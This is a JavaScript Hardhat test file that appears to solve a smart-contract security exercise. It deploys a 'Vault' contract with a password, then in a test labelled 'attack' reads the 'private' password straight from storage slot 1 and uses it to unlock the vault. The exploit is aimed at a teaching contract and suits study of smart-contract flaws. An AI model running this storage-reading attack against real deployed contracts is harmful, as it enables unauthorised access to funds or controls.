const { expect } = require("chai");

const { scriptEmojis } = require("./");
const { ethers } = require("hardhat");

describe(`${scriptEmojis[0]}Vault`, () => {
    let vault, password;
    before(async () => {
        password = "UNCRACKABLE_PASSKEY";

        vault = await ethers.deployContract("Vault", [
            ethers.encodeBytes32String(password),
        ]);

        await vault.waitForDeployment();
    });

    describe(`deployment 'Vault' SC ${scriptEmojis[1]}`, () => {
        it(`should have an 'address' ${
            scriptEmojis[scriptEmojis.length - 1]
        }`, () => {
            let _address = vault.target;

            expect(_address).not.equal("");
            expect(_address).not.equal(0x0);
            expect(_address).not.equal(null);
            expect(_address).not.equal(undefined);
        });

        it(`should have 'locked' state variable ${
            scriptEmojis[scriptEmojis.length - 1]
        }`, async () => {
            let _locked = await vault.locked();

            expect(_locked).not.equal(null);
            expect(_locked).not.equal(undefined);
            expect(_locked).is.equal(true);
        });
    });

    describe(`mobilize ${scriptEmojis[2]}`, () => {
        it(`attack - Vault SC ${
            scriptEmojis[scriptEmojis.length - 1]
        }`, async () => {
            const _passwordBytes = await ethers.provider.getStorage(
                vault.target,
                1
            );
            const _password = ethers.decodeBytes32String(_passwordBytes);

            expect(_password).not.equal(null);
            expect(_password).not.equal(undefined);
            expect(_password).is.equal(password);

            let tx = await vault.unlock(_passwordBytes);

            await tx.wait();

            console.log(`${scriptEmojis[0] * 3}\nUnlocked 🔓`);
        });
    });
});
